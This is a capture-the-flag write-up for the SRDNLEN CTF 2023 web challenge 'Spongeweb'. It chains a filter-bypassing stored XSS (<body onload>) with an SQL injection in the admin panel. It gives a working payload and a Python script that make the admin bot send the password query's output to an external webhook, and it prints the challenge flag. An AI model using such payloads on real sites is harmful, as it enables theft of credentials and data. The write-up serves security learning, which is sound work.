# SRDNLEN CTF 2023

## [web] Spongeweb (30 solves)
I really like hacking.<br>
I really like privacy.<br>
And I really like spongebob.<br>
I combined all of them and created an anonymous sharing platform with html support. Feel free to share payloads, malware and stolen credit cards ;).

Btw it's called spongeweb but it has nothing to do with [this](https://trollpasta.com/wiki/SpongeWeb).

Site: [http://spongeweb.challs.srdnlen.it](http://spongeweb.challs.srdnlen.it)


Author: [@sanmatte](https://github.com/sanmatte)

## Exploitation

The flag is stored in the db as admin password, we can see it from the `schema.sql` file which is used to init the db.
Since it isn't allowed to bruteforce the login in the admin panel, we've got to find another way to get the flag. 

Inside the admin panel, once logged in, the admin can execute the following sql query:

```python
cur = get_db().execute("SELECT count(*) FROM {0}".format(query))
```
where the format string argument `query` is the user input.

Looking at the site we know it's possible to create new threads and view them in the `/view?id=` endpoint.
And we can send our unapproved threads to the admin in the `/report` endpoint.

It is also possible to inject HTML when creating a new thread. However both the `<script>` and `<img>` tags are blacklisted.

Since this is not the only to execute javascript we can still inject malicious code with different tags, such as `<body onload=" ">`.

We can now force the admin to make a request to `/admin?query=` and send the response to our webhook:

```html
<body onload="fetch('http://spongeweb.challs.srdnlen.it/admin?query=users+union+select+password+from+users', {mode:'no-cors'}).then(function (data) { return data.text(); }).then(function (html) {fetch('https://webhook.site/[YOURWEBHOOK]?c='+encodeURIComponent(html), {mode:'no-cors'});}).catch(function (err) {  console.warn('Something went wrong.', err); })"></body>
```
with python requests:
```py
import requests
payload = "<body onload=\"fetch('http://spongeweb.challs.srdnlen.it/admin?query=users+union+select+password+from+users', {mode:'no-cors'}).then(function (data) { return data.text(); }).then(function (html) {fetch('https://webhook.site/[YOURWEBHOOK]?r='+encodeURIComponent(html), {mode:'no-cors'});}).catch(function (err) {  console.warn('Something went wrong.', err); })\"></body>"
r = requests.post('http://spongeweb.challs.srdnlen.it/thread', data={'title': 'payload', 'thread':payload})
print(payload)
view = r.url
url = "http://spongeweb.challs.srdnlen.it:80/report/"
headers = {"sec-ch-ua": "\"Not=A?Brand\";v=\"99\", \"Chromium\";v=\"118\"", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36", "sec-ch-ua-platform": "\"macOS\"", "Origin": "http://spongeweb.challs.srdnlen.it", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://spongeweb.challs.srdnlen.it/report/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
data = {"url": view}
res = requests.post(url, headers=headers, data=data)
```

## Summary:
- We bypassed the javascript filters with a different tag such as `<body onload=" ">`.
- We exploited the SQL Injection in the admin panel with: `users union select password from users`
- Combaining those two things we exploited the xss vulnerability in the threads -> made a fetch to `/admin?query=users union select password from users`, saved the response and sent it to our webhook.
- Reported the thread to the admin in the `/report` endpoint and got the flag.

## FLAG
The flag was `srdnlen{XSSS_cr0Ss_S1T3_sP0nG3wEb_SQLi}`.
